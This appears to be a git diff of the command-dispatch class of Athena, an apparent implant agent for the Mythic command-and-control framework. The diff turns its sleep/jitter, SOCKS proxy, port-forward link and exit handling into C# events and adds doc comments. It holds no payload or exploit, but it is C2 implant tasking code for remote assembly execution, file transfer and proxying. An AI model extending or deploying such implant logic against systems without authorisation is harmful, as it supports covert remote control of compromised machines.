@@ -8,15 +8,24 @@ using System.Collections.Concurrent;
 using System.Text;
 using Athena.Utilities;
 using Newtonsoft.Json;
-using Athena.Models.Mythic.Response;
+using Athena.Models.Athena.Commands;
 
 namespace Athena.Commands
 {
     public class CommandHandler
     {
-        public Action<int[]> ActionSetSleepAndJitter;
-        public Action<MythicJob> ActionStartForwarder;
-        public Action<MythicJob> ActionStartSocks;
+        public delegate void SetSleepAndJitterHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> SetSleepAndJitter;
+        public delegate void StartForwarderHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> StartForwarder;
+        public delegate void StopForwarderHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> StopForwarder;
+        public delegate void StartSocksHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> StartSocks;
+        public delegate void StopSocksHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> StopSocks;
+        public delegate void ExitRequestedHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> ExitRequested;
 
         private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
         private AssemblyHandler assemblyHandler { get; set; }
@@ -33,11 +42,15 @@ namespace Athena.Commands
             this.uploadHandler = new UploadHandler();
             this.responseResults = new ConcurrentBag<object>();
         }
+        /// <summary>
+        /// Initiate a task provided by the Mythic server
+        /// </summary>
+        /// <param name="task">MythicTask object containing the parameters of the task</param>
         public async Task StartJob(MythicTask task)
         {
+            EventHandler handler;
             MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
             job.started = true;
-            Task t;
 
             switch (job.task.command)
             {
@@ -47,11 +60,11 @@ namespace Athena.Commands
                         this.responseResults.Add(await downloadHandler.StartDownloadJob(job));
                     }
                     break;
-                case "execute-assembly":
+                case "execute-assembly": //Should be able to stop it
                     this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
                     break;
                 case "exit":
-                    Environment.Exit(0);
+                    RequestExit(job);
                     break;
                 case "jobs": //Can likely be dynamically loaded
                     this.responseResults.Add(await this.GetJobs(task.id));
@@ -67,7 +80,7 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "link":
-                    ActionStartForwarder(job);
+                    StartInternalForwarder(job);
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "load":
@@ -87,11 +100,19 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "sleep":
-                    this.responseResults.Add(await this.SetSleep(job));
+                    UpdateSleepAndJitter(job);
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "socks": //Maybe can be dynamically loaded? Might be better to keep it built-in
-                    ActionStartSocks(job);
+                    var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    if((string)socksInfo["action"] == "start")
+                    {
+                        StartSocksProxy(job);
+                    }
+                    else
+                    {
+                        StopSocksProxy(job);
+                    }
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "stop-assembly":
@@ -104,6 +125,7 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "unlink":
+                    StopInternalForwarder(job);
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "upload": //Can likely be dynamically loaded
@@ -117,10 +139,71 @@ namespace Athena.Commands
                     break;
             }
         }
+        /// <summary>
+        /// EventHandler to begin exit
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void RequestExit(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            ExitRequested(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to start socks proxy
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void StartSocksProxy(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            StartSocks(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to stop socks proxy
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void StopSocksProxy(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            StopSocks(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to start internal forwarder
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void StartInternalForwarder(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            StartForwarder(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to stop internal forwarder
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void StopInternalForwarder(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            StopForwarder(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to update sleep and jitter
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void UpdateSleepAndJitter(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            SetSleepAndJitter(this, exitArgs);
+        }
+        /// <summary>
+        /// Cancel a currently executing job
+        /// </summary>
+        /// <param name="task">MythicTask containing the task id to cancel</param>
         public async Task StopJob(MythicTask task)
         {
             //todo
         }
+        /// <summary>
+        /// Provide a list of repsonses to the MythicClient
+        /// </summary>
         public async Task<List<object>> GetResponses()
         {
             List<object> responses = this.responseResults.ToList<object>();
@@ -137,10 +220,18 @@ namespace Athena.Commands
             this.responseResults.Clear();
             return responses;
         }
+        /// <summary>
+        /// Add a ResponseResult to the response list
+        /// </summary>
+        /// <param name="response">ResposneResult or inherited object containing the task results</param>
         public async Task AddResponse(object response)
         {
             this.responseResults.Add(response);
         }
+        /// <summary>
+        /// Add multiple ResponseResult to the response list
+        /// </summary>
+        /// <param name="response">ResposneResult or inherited object containing the task results</param>
         public async Task AddResponse(List<object> responses)
         {
             foreach(object response in responses)
@@ -148,6 +239,10 @@ namespace Athena.Commands
                 this.responseResults.Prepend<object>(response); //Add to the beginning in case another task result returns
             }
         }
+        /// <summary>
+        /// Get the currently running jobs
+        /// </summary>
+        /// <param name="task_id">Task ID of the mythic job to respond to</param>
         private async Task<ResponseResult> GetJobs(string task_id)
         {
             StringBuilder sb = new StringBuilder();
@@ -171,10 +266,9 @@ namespace Athena.Commands
                 task_id = task_id,
                 completed = "true"
             };
-        }
-        
+        }     
         /// <summary>
-        /// Determine if a Mythic command is loaded, if it is, run it
+        /// Check if a plugin is already loaded and execute it
         /// </summary>
         /// <param name="job">MythicJob containing execution parameters</param>
         private async Task<object> CheckAndRunPlugin(MythicJob job)
@@ -194,6 +288,10 @@ namespace Athena.Commands
                 };
             }
         }
+        /// <summary>
+        /// Begin the next process of the upload task
+        /// </summary>
+        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
         public async Task HandleUploadPiece(MythicResponseResult response)
         {
             MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
@@ -254,6 +352,10 @@ namespace Athena.Commands
                 });
             }
         }
+        /// <summary>
+        /// Begin the next process of the download task
+        /// </summary>
+        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
         public async Task HandleDownloadPiece(MythicResponseResult response)
         {
             MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
@@ -325,36 +427,22 @@ namespace Athena.Commands
                     });
                 }
             }
-        }   
+        }
+        /// <summary>
+        /// Check if an upload job exists
+        /// </summary>
+        /// <param name="task_id">Task ID of the mythic job to respond to</param>
         public async Task<bool> HasUploadJob(string task_id)
         {
             return await this.uploadHandler.ContainsJob(task_id);
         }
+        /// <summary>
+        /// Check if a download job exists
+        /// </summary>
+        /// <param name="task_id">Task ID of the mythic job to respond to</param>
         public async Task<bool> HasDownloadJob(string task_id)
         {
             return await this.downloadHandler.ContainsJob(task_id);
-        }
-        private async Task<ResponseResult> SetSleep(MythicJob job)
-        {
-            StringBuilder sb = new StringBuilder();
-            var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-
-            try
-            {
-                ActionSetSleepAndJitter(new int[] { int.Parse(sleepInfo["sleep"].ToString()), int.Parse(sleepInfo["jitter"].ToString()) });
-                sb.AppendLine($"Set sleep to: {sleepInfo["sleep"]}");
-            }
-            catch (Exception e)
-            {
-                sb.AppendLine("Invalid sleep or jitter specified.");
-            }
-
-            return new ResponseResult
-            {
-                user_output = sb.ToString(),
-                completed = "true",
-                task_id = job.task.id,
-            };
-        }    
+        }   
     }
 }
